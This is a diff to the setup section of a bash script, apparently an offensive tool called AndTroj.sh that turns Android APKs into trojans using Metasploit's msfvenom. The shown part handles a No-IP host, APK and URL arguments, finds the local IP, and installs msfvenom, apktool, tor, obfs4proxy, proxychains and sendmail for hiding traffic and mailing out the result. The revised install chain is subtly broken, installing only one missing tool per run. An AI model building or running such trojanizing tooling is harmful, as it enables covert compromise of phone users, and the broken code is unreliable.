@@ -1,5 +1,4 @@
 #!/bin/bash
-# v67
 # ┌──(avi㉿unk9vvn)-[~]
 # └─$ sudo chmod +x AndTroj.sh;sudo ./AndTroj.sh $NoIP $APK $URL
 
@@ -28,8 +27,8 @@ fi
 NoIP=$1
 APK=$2
 URL=$3
-ORGAPK='/tmp/original'
-PAYLOAD='/tmp/payload'
+ORGAPK="/tmp/original"
+PAYLOAD="/tmp/payload"
 OUTPUT=`echo $APK | cut -d "." -f 1`
 SCRIPT_DIR=$(cd "$(dirname "${BASH_SOURCE[0]}")" &> /dev/null && pwd)
 LAN=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | grep -v '169.*.*.*' | grep -v '192.168.56.*' | grep -v '192.168.236.*')
@@ -39,16 +38,37 @@ LAN=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*
 #-------------------------------OS Initial-------------------------------#
 
 
-# Install Tools
-if [[ ! -f "/usr/bin/git" || ! -f "/usr/bin/tor" || ! -f "/usr/bin/curl" || ! -f "/usr/local/bin/apktool" || ! -f "/usr/sbin/sendmail" || ! -f "/usr/bin/proxychains" || ! -f "/usr/bin/obfs4proxy" || ! -f "/usr/bin/msfvenom" ]];then
-	echo -e "$GREEN [*]$YELLOW Installing Required Tools $YELLOW"
-	apt-get -q update;apt-get install -y -q git tor proxychains zipalign obfs4proxy curl aapt apktool default-jdk openjdk-11-jdk metasploit-framework sendemail apache2
 
-	if [ "$(apktool -version)" != "$apktool_version" ];then
-		wget -q https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.6.1.jar -O /usr/local/bin/apktool.jar
-		wget -q https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool -O /usr/local/bin/apktool
-		chmod +x /usr/local/bin/apktool && chmod +x /usr/local/bin/apktool.jar
-	fi
+# Install Tools
+if [[ ! -f "/usr/bin/git" ]];then
+    echo -e "$GREEN [*]$YELLOW Installing git $YELLOW"
+    apt-get install -y -q git
+elif [[ ! -f "/usr/bin/tor" ]];then
+    echo -e "$GREEN [*]$YELLOW Installing tor $YELLOW"
+    apt-get install -y -q tor
+elif [[ ! -f "/usr/bin/curl" ]];then
+    echo -e "$GREEN [*]$YELLOW Installing curl $YELLOW"
+    apt-get install -y -q curl
+elif [[ ! -f "/usr/bin/apktool" ]];then
+    echo -e "$GREEN [*]$YELLOW Installing apktool $YELLOW"
+    apt-get install -y -q apktool
+elif [[ ! -f "/usr/bin/sendmail" ]];then
+    echo -e "$GREEN [*]$YELLOW Installing sendmail $YELLOW"
+    apt-get install -y -q sendmail
+elif [[ ! -f "/usr/bin/proxychains" ]];then
+    echo -e "$GREEN [*]$YELLOW Installing proxychains $YELLOW"
+    apt-get install -y -q proxychains
+elif [[ ! -f "/usr/bin/obfs4proxy" ]];then
+    echo -e "$GREEN [*]$YELLOW Installing obfs4proxy $YELLOW"
+    apt-get install -y -q obfs4proxy
+elif [[ ! -f "/usr/bin/msfvenom" ]];then
+    echo -e "$GREEN [*]$YELLOW Installing msfvenom $YELLOW"
+    apt-get install -y -q msfvenom
+elif [ "$(apktool -version)" != "$apktool_version" ];then
+    echo -e "$GREEN [*]$YELLOW Upgrading apktool -> $apktool_version $YELLOW"
+    wget -q https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.6.1.jar -O /usr/local/bin/apktool.jar
+	wget -q https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool -O /usr/local/bin/apktool
+	chmod +x /usr/local/bin/apktool && chmod +x /usr/local/bin/apktool.jar
 fi
 
 
